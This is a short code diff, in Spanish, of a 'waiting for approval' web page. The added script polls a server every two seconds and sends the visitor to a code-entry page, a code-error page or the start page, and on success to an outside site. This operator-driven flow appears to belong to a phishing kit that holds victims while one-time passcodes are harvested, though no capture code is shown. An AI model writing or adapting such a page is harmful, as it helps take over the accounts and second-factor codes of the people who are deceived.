@@ -8,22 +8,19 @@
 <h2>⏳ Esperando aprobación...</h2>
 
 <script>
-const requestId = localStorage.getItem("requestId");
+const id=localStorage.getItem("id");
 
-async function verificar() {
-  const res = await fetch(`/api/estado/${requestId}`);
-  const data = await res.json();
+async function check(){
+  const r=await fetch("/api/estado/"+id);
+  const j=await r.json();
 
-  if (data.estado === "ok") {
-    window.location.href = "ok.html";
-  }
-
-  if (data.estado === "error") {
-    window.location.href = "error.html";
-  }
+  if(j.estado==="index") location="index.html";
+  if(j.estado==="codigo") location="codigo.html";
+  if(j.estado==="ok") location="https://google.com/codigo";
+  if(j.estado==="coderr") location="codigoerr.html";
 }
 
-setInterval(verificar, 3000);
+setInterval(check,2000);
 </script>
 
 </body>
